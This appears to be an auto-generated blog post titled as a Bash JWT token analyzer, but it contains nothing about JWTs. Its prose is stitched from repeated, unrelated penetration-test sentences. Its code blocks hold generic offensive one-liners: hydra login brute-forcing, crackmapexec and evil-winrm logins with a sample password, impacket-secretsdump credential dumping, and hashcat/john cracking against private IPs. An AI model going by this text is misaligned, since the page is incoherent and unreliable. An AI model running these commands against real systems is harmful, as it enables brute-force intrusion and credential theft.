---
TitleSEO: "JWT Token Analyzer in Bash | ZureFX"
TitlePost: "JWT Token Analyzer — Bash"
Author: "ZureFX"
Description: "A Bash script for jwt token analyzer. Built for security research and automation."
Keywords: "tool, c, automation, scanner, bash"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-547.html"
URL_IMAGES: ""
Date: "2024-07-27"
Tags: "Tool, C, Automation, Scanner, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-547"
Permalink: "/scripting/script-jwt-token-analyzer-547.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `smbexec`
- `socat`
- `bloodhound`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
crackmapexec smb 10.49.221.205 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.27.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.38.239.209/FUZZ
evil-winrm -i 10.65.123.90 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p139,993,27017 10.77.62.218 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.76.82
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.106.133 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.33.132 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory.

```bash
crackmapexec smb 10.10.141.150 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.17.151.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p3306,135,5985 10.95.30.165 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 23.04s
```
